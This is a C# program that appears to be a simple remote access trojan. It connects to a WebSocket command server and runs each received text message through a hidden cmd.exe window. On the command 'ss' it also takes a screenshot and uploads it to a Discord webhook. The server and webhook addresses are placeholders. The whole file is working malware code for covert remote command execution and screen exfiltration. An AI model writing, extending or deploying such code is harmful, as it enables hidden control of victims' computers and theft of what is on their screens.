using System;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Drawing;
using System.Net;
using System.Drawing.Imaging;
using System.Text;
using System.Xml.Linq;
using Newtonsoft.Json.Linq;
using System.Net.Http;
class Program
{

    static async Task Main(string[] args)
    {
        string serverUri = "websocket url";

        using (var client = new ClientWebSocket())
        {
            try
            {
                await client.ConnectAsync(new Uri(serverUri), CancellationToken.None);
                await ReceiveMessages(client);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Connection error: {ex.Message}");
            }
        }
    }

    static async Task ReceiveMessages(ClientWebSocket client)
    {
        byte[] buffer = new byte[1024];

        while (client.State == WebSocketState.Open)
        {
            var result = await client.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);

            if (result.MessageType == WebSocketMessageType.Text)
            {
                string message = System.Text.Encoding.UTF8.GetString(buffer, 0, result.Count);
                Process cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Console.WriteLine(message);
                    if (message.Equals("ss"))
                    {
                        Bitmap ss = screenshot();

                        string filePath = "C:\\Users\\mert\\AppData\\Local\\Temp\\screenshot.png";
                        ss.Save(filePath, ImageFormat.Png);

                        string webhookUrl = "webhookurl";

                        string uploadResult = await SendImageToDiscord(webhookUrl, filePath);
                        Console.WriteLine(uploadResult);

                        // Send a WebSocket success message
                        if (client.State == WebSocketState.Open)
                        {
                            byte[] successMessage = Encoding.UTF8.GetBytes("Image uploaded successfully to Discord!");
                            await client.SendAsync(new ArraySegment<byte>(successMessage), WebSocketMessageType.Text, true, CancellationToken.None);
                        }

                    }
                cmd.StartInfo.Arguments = "/c " + message;
                    cmd.Start();
                }
            else if (result.MessageType == WebSocketMessageType.Close)
            {
                await client.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None);
            }
        }
    }

    static async Task<string> SendImageToDiscord(string webhookUrl, string imagePath)
    {
        using (HttpClient client = new HttpClient())
        {
            using (MultipartFormDataContent content = new MultipartFormDataContent())
            {
                byte[] imageBytes = File.ReadAllBytes(imagePath);
                ByteArrayContent imageContent = new ByteArrayContent(imageBytes);
                imageContent.Headers.Add("Content-Type", "image/png");

                content.Add(imageContent, "file", "image.png");

                HttpResponseMessage response = await client.PostAsync(webhookUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    return "Image uploaded successfully to Discord!";
                }
                else
                {
                    return $"Error sending image. Status code: {response.StatusCode}";
                }
            }
        }
    }

    static Bitmap screenshot()
    {
        Bitmap screenshot = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);

        using (Graphics graphics = Graphics.FromImage(screenshot))
        {
            // Copy the contents of the screen to the screenshot Bitmap
            graphics.CopyFromScreen(0,0, 0, 0, screenshot.Size, CopyPixelOperation.SourceCopy);
        }

        return screenshot;
    }

}
